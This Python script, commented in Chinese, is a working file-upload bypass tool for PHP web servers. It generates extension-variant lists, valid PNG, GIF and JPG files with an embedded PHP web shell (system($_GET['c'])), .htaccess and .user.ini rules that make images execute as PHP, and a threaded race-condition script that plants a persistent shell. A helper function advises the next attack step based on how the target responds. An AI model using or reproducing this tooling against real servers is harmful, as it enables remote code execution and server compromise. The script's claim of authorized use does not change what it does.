#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""文件上传绕过辅助（离线）：后缀变体 / 图片马与合法 PNG 生成 / .htaccess 与 .user.ini / 竞争循环脚本。

纯标准库、离线：只生成字节与文本，不发包；竞争脚本以文本形式打印，供人工在授权环境运行。
"""
import argparse
import struct
import sys
import zlib

PHP_SHELL = b"<?php system($_GET['c']); ?>"
MAGIC_OK = {
    "gif": b"GIF89a",
    "jpg": b"\xFF\xD8\xFF\xE0\x00\x10JFIF\x00",
    "png": b"\x89PNG\r\n\x1a\n",
}
PHP_EXTS = ("php", "php1", "php2", "php3", "php4", "php5", "php7", "php8", "phtml", "pht",
            "phar", "phps", "pgif", "inc")
IMAGE_EXTS = ("jpg", "jpeg", "png", "gif")
HTACCESS_RULES = {
    "addtype": "AddType application/x-httpd-php .jpg\n",
    "sethandler": "SetHandler application/x-httpd-php\n",
    "prepend": "php_value auto_prepend_file shell.jpg\n",
}
USER_INI = "auto_prepend_file = shell.jpg\n"


class UpError(ValueError):
    pass


def ext_variants(stem="shell", ext="php"):
    """黑名单/白名单常见绕过后缀清单。"""
    if not stem or not ext:
        raise UpError("stem 与 ext 不能为空")
    v = []
    v.append("%s.%s" % (stem, ext))
    v.append("%s.%s" % (stem, ext.upper()))
    v.append("%s.%s" % (stem, ext.capitalize()))
    for e in PHP_EXTS:
        if e != ext:
            v.append("%s.%s" % (stem, e))
    v.append("%s.%s.jpg" % (stem, ext))       # Apache 多后缀 AddHandler
    v.append("%s.jpg.%s" % (stem, ext))       # 反向多后缀
    v.append("%s.%s." % (stem, ext))          # 末尾点（Windows 自动去掉）
    v.append("%s.%s " % (stem, ext))          # 尾随空格
    v.append("%s.%s::$DATA" % (stem, ext))    # NTFS 数据流
    v.append("%s.%s%%00.jpg" % (stem, ext))    # 空字节截断（旧 PHP）
    v.append("%s.%s/" % (stem, ext))          # 目录名（路径穿越）
    v.append("%s..%s" % (stem, ext))          # 双点
    return v


def build_png(php=PHP_SHELL, chunk="tEXt", size=1):
    """生成结构合法、getimagesize 能过、且尾部塞了 PHP 的 PNG。"""
    if not isinstance(php, (bytes, bytearray)):
        php = str(php).encode("utf-8")
    if chunk not in ("tEXt", "IDAT", "both"):
        raise UpError("chunk 只能是 tEXt/IDAT/both，收到 %r" % (chunk,))
    if not (1 <= size <= 64):
        raise UpError("size 需在 1..64")

    def ck(t, d):
        c = t + d
        return struct.pack(">I", len(d)) + c + struct.pack(">I", zlib.crc32(c) & 0xFFFFFFFF)

    raw = b""
    for _ in range(size):
        raw += b"\x00" + bytes([0x41, 0x42, 0x43]) * size
    idat = zlib.compress(raw)
    if chunk in ("IDAT", "both"):
        idat = zlib.compress(raw + php)
    ihdr = ck(b"IHDR", struct.pack(">IIBBBBB", size, size, 8, 2, 0, 0, 0))
    out = b"\x89PNG\r\n\x1a\n" + ihdr + ck(b"IDAT", idat)
    if chunk in ("tEXt", "both"):
        out += ck(b"tEXt", b"Comment\x00" + php)
    out += ck(b"IEND", b"")
    return out


def build_polyglot(kind="gif", php=PHP_SHELL):
    """头部取真实文件头 + 直接拼接 PHP。"""
    kind = (kind or "").lower()
    if kind not in MAGIC_OK:
        raise UpError("kind 只能是 gif/jpg/png，收到 %r" % (kind,))
    php = php.encode("utf-8") if isinstance(php, str) else bytes(php)
    if kind == "png":
        return build_png(php, chunk="both")
    return MAGIC_OK[kind] + php


def check_magic(data, kind="auto"):
    """模拟 getimagesize 的头部判定（只认前 12 字节）。"""
    magic_of = {"png": MAGIC_OK["png"], "jpg": b"\xFF\xD8\xFF", "gif": MAGIC_OK["gif"]}
    if kind != "auto":
        if kind not in magic_of:
            raise UpError("kind 只能是 auto/png/jpg/gif")
        return data.startswith(magic_of[kind])
    return any(data.startswith(m) for m in magic_of.values())


def htaccess(kind="addtype", ext="jpg"):
    if kind not in HTACCESS_RULES:
        raise UpError("规则只能是 %s" % "/".join(HTACCESS_RULES))
    rule = HTACCESS_RULES[kind]
    return rule.replace(".jpg", "." + ext.lstrip(".")) if kind != "sethandler" else rule


def race_script(upload_url, shell_url):
    """生成条件竞争双线程脚本文本（只打印，不执行）。"""
    if not upload_url.startswith(("http://", "https://")) or not shell_url.startswith(("http://", "https://")):
        raise UpError("URL 必须 http(s) 开头")
    return (
        "# 条件竞争：线程组 A 反复上传，线程组 B 反复 GET；命中后落地永久 shell\n"
        "import threading, time, itertools, requests\n"
        "URL_UP = %r\n"
        "URL_GET = %r\n"
        "EVIL = b'GIF89a<?php file_put_contents(\"pwns.php\", \"<?php system($_GET[c]);?>\"); ?>'\n"
        "stop = False\n"
        "def up():\n"
        "    while not stop:\n"
        "        try: requests.post(URL_UP, files={'f': ('shell.php', EVIL, 'image/gif')}, timeout=3)\n"
        "        except Exception: pass\n"
        "def get():\n"
        "    while not stop:\n"
        "        try:\n"
        "            r = requests.get(URL_GET, timeout=3)\n"
        "            if r.status_code == 200 and 'pwns' in r.text: print('[+] hit')\n"
        "        except Exception: pass\n"
        "ts = [threading.Thread(target=up, daemon=True) for _ in range(8)] + "
        "[threading.Thread(target=get, daemon=True) for _ in range(8)]\n"
        "for t in ts: t.start()\n" % (upload_url, shell_url)
    )


def judge(text):
    """按上传后的现象给出下一步建议。"""
    t = (text or "").lower()
    if not t.strip():
        raise UpError("请输入上传后的现象描述")
    tips = []
    if "删除" in text or "清理" in text or "not allowed" in t:
        tips.append("目标在上传后删除 → 条件竞争（--race）")
    if "404" in t or "重命名" in text or "uuid" in t or "缩略图" in text or "二次渲染" in text:
        tips.append("落地后访问 404/改名 → 二次渲染或随机名，改 .htaccess/.user.ini 或写永久 shell")
    if "getimagesize" in t or "图片" in text or "image" in t:
        tips.append("校验文件头 → 用 --png 生成合法 PNG（tEXt 块）或 --polyglot")
    if "content-type" in t:
        tips.append("只查 Content-Type → 抓包改成 image/jpeg")
    if "php" in t and ("禁" in text or "allow" in t or "拒绝" in text):
        tips.append("禁 php → 试 phtml/pht/phar 或 .htaccess 改解析")
    return tips or ["信息不足：先确认上传后文件是否可访问、返回 200 还是 500"]


def selftest():
    fails = []

    # 1. 正常路径：后缀清单
    vs = ext_variants("shell", "php")
    for want in ("shell.phtml", "shell.phar", "shell.PHP", "shell.php.jpg", "shell.php.", "shell.php::$DATA"):
        if want not in vs:
            fails.append("case1: 缺后缀变体 %s -> %r" % (want, vs))
    if len(set(vs)) != len(vs):
        fails.append("case1b: 后缀变体重复")

    # 2. 正常路径：PNG 合法性与 PHP 存活
    png = build_png()
    if not png.startswith(MAGIC_OK["png"]):
        fails.append("case2: PNG 签名错")
    if not check_magic(png, "png"):
        fails.append("case2b: check_magic 未认出 PNG")
    if PHP_SHELL not in png:
        fails.append("case2c: PHP payload 丢失")
    # 逐块校验 CRC：IHDR / IDAT / tEXt / IEND
    off, blocks = 8, []
    while off < len(png):
        ln = struct.unpack(">I", png[off:off + 4])[0]
        typ = png[off + 4:off + 8]
        body = png[off + 4:off + 8 + ln]
        crc = struct.unpack(">I", png[off + 8 + ln:off + 12 + ln])[0]
        if zlib.crc32(body) & 0xFFFFFFFF != crc:
            fails.append("case2d: 块 %r CRC 错" % (typ,))
        blocks.append(typ)
        off += 12 + ln
    if blocks != [b"IHDR", b"IDAT", b"tEXt", b"IEND"]:
        fails.append("case2e: PNG 块顺序错 %r" % (blocks,))
    idat_png = build_png(chunk="IDAT")
    if b"tEXt" in idat_png or PHP_SHELL not in zlib.decompress(
            idat_png[33 + 8: 33 + 8 + struct.unpack(">I", idat_png[33:37])[0]]):
        fails.append("case2f: IDAT 分支应把 payload 压进 IDAT")

    # 3. 正常路径：图片马 / .htaccess / .user.ini / 竞争脚本
    gif = build_polyglot("gif")
    if not gif.startswith(b"GIF89a") or PHP_SHELL not in gif:
        fails.append("case3: GIF 图片马错")
    if not check_magic(build_polyglot("jpg"), "jpg"):
        fails.append("case3b: JPG 图片马头部错")
    if htaccess("addtype") != "AddType application/x-httpd-php .jpg\n":
        fails.append("case3c: AddType 规则错")
    if htaccess("addtype", "phtml") != "AddType application/x-httpd-php .phtml\n":
        fails.append("case3d: 扩展名替换错")
    if USER_INI.strip() != "auto_prepend_file = shell.jpg":
        fails.append("case3e: .user.ini 内容错")
    rs = race_script("http://t/upload.php", "http://t/upload/shell.php")
    if "URL_UP = 'http://t/upload.php'" not in rs or "GIF89a" not in rs:
        fails.append("case3f: 竞争脚本模板错")

    # 4. 边界：判定提示
    if "条件竞争" not in " ".join(judge("上传后提示文件已删除")):
        fails.append("case4: 删除现象未建议竞争")
    if ".user.ini" not in " ".join(judge("图片上传后返回缩略图且 getimagesize 校验通过")):
        fails.append("case4b: 二次渲染未建议 htaccess/user.ini")
    if "信息不足" not in " ".join(judge("未知")):
        fails.append("case4c: 无信息时应给兜底提示")

    # 5. 坏输入拒绝
    bad = [
        ("空 stem", lambda: ext_variants("", "php")),
        ("非法 chunk", lambda: build_png(chunk="EXIF")),
        ("超尺寸", lambda: build_png(size=999)),
        ("未知图片类型", lambda: build_polyglot("bmp")),
        ("未知 htaccess 规则", lambda: htaccess("deny")),
        ("非 http URL", lambda: race_script("ftp://a", "http://b")),
        ("空现象", lambda: judge("")),
    ]
    for name, fn in bad:
        try:
            fn()
            fails.append("case5: %s 未被拒绝" % name)
        except UpError:
            pass

    # 6. 参数不足
    tiny = argparse.ArgumentParser(prog="file_upload_bypass", add_help=False)
    tiny.exit = lambda status=0, message=None: (_ for _ in ()).throw(SystemExit(status))
    tiny._print_message = lambda message, file=None: None
    tiny.add_argument("--x")
    try:
        tiny.error("需要 --exts/--png/--polyglot/--htaccess/--user-ini/--race/--judge；或用 --selftest")
        fails.append("case6: ap.error 未抛 SystemExit")
    except SystemExit as e:
        if e.code != 2:
            fails.append("case6: 退出码 %r" % (e.code,))

    for f in fails:
        print("FAIL %s" % f, file=sys.stderr)
    if fails:
        return 1
    print("selftest ok: 6/6（后缀清单、PNG结构与CRC、图片马与配置与竞争模板、判定提示、坏输入拒绝、参数不足）")
    return 0


def main(argv=None):
    ap = argparse.ArgumentParser(description="文件上传绕过辅助：后缀变体 / 图片马 / .htaccess / 条件竞争（离线）")
    ap.add_argument("--exts", action="store_true", help="输出后缀绕过清单")
    ap.add_argument("--stem", default="shell")
    ap.add_argument("--ext", default="php")
    ap.add_argument("--png", metavar="OUT", default=None, help="生成合法 PNG 图片马并写出")
    ap.add_argument("--polyglot", metavar="OUT", default=None, help="生成 GIF/JPG 图片马并写出")
    ap.add_argument("--kind", default="gif", choices=["gif", "jpg", "png"])
    ap.add_argument("--php", default=None, help="自定义 PHP 代码（默认 system($_GET['c'])）")
    ap.add_argument("--htaccess", nargs="?", const="addtype", default=None,
                    choices=list(HTACCESS_RULES), help="打印 .htaccess 规则")
    ap.add_argument("--user-ini", action="store_true", help="打印 .user.ini 内容")
    ap.add_argument("--race", nargs=2, metavar=("UPLOAD", "SHELL"), default=None, help="打印条件竞争脚本")
    ap.add_argument("--judge", metavar="TEXT", default=None, help="按现象给下一步建议")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)

    if args.selftest:
        return selftest()
    php = args.php.encode("utf-8") if args.php else PHP_SHELL
    try:
        if args.png is not None:
            data = build_png(php)
            with open(args.png, "wb") as f:
                f.write(data)
            print("[+] 已写 %s（%d 字节，PHP payload 在 tEXt 块）" % (args.png, len(data)))
            return 0
        if args.polyglot is not None:
            data = build_polyglot(args.kind, php)
            with open(args.polyglot, "wb") as f:
                f.write(data)
            print("[+] 已写 %s（%d 字节，%s 头）" % (args.polyglot, len(data), args.kind))
            return 0
        if args.htaccess is not None:
            print(htaccess(args.htaccess, args.ext), end="")
            return 0
        if args.user_ini:
            print(USER_INI, end="")
            return 0
        if args.race is not None:
            print(race_script(args.race[0], args.race[1]))
            return 0
        if args.judge is not None:
            for t in judge(args.judge):
                print("- %s" % t)
            return 0
        if args.exts:
            for v in ext_variants(args.stem, args.ext):
                print(v)
            return 0
        ap.error("需要 --exts/--png/--polyglot/--htaccess/--user-ini/--race/--judge；或用 --selftest")
        return 2
    except UpError as e:
        print("错误：%s" % e, file=sys.stderr)
        return 2
    except OSError as e:
        print("错误：写文件失败 %s" % e, file=sys.stderr)
        return 2


if __name__ == "__main__":
    sys.exit(main())
